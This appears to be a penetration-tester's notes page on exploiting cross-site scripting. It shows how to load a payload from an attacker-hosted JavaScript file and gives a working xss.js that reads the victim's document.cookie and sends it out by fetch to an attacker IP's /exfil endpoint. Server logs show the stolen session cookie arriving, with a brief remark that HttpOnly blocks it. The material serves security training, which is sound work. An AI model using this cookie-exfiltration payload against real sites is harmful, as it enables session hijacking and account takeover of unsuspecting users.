---
layout:
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
---

# Exploitation

## Moving the Payload to an External Resource

Creating a JavaScript file containing the payload and serve that to the target by using `<script src="http://<attacker_IP>/xss.js"></script>`.&#x20;

<figure><img src="../../../../.gitbook/assets/web_xss_exploitation_1.png" alt=""><figcaption><p>Figure 1: Serving a malicious JavaScript file to the target.</p></figcaption></figure>

{% hint style="warning" %}
This payload can't be used for any other XSS styles that won't automatically execute JavaScript, such as client XSS vulnerabilities that use `innerHTML`.
{% endhint %}

## Session Hijacking

We can create a malicious JavaScript file and exfiltrate the target's session cookie.

{% code title="xss.js" overflow="wrap" %}
```javascript
// save the value of the cookie in a variable
let cookie = document.cookie
// URL-encode the variable
let encodedCookie = encodeURIComponent(cookie)

// make a GET request to our attacker machine exfiltrating the cookie
fetch("http://192.168.45.214/exfil?data=" + encodedCookie)
```
{% endcode %}

We can serve the payload using the same script as above.

```javascript
<script src="http://192.168.45.214/xss.js"></script>
```

When the target clicks the malicious link, we will receive their cookie.

{% code overflow="wrap" %}
```bash
$ sudo python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
192.168.198.101 - - [05/Aug/2024 12:07:13] "GET /xss.js HTTP/1.1" 200 -
192.168.198.101 - - [05/Aug/2024 12:07:13] code 404, message File not found
192.168.198.101 - - [05/Aug/2024 12:07:13] "GET /exfil?data=session%3DSomeExampleCookie HTTP/1.1" 404 -
```
{% endcode %}

If the cookie has the [`HttpOnly`](../../common-findings/cookie-flags.md) flag set, JavaScript cannot access it, thus, we can't exfiltrate its value.

```bash
$ sudo python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
192.168.198.101 - - [05/Aug/2024 12:15:53] "GET /xss.js HTTP/1.1" 200 -
192.168.198.101 - - [05/Aug/2024 12:15:53] code 404, message File not found
192.168.198.101 - - [05/Aug/2024 12:15:53] "GET /exfil?data= HTTP/1.1" 404 -
```
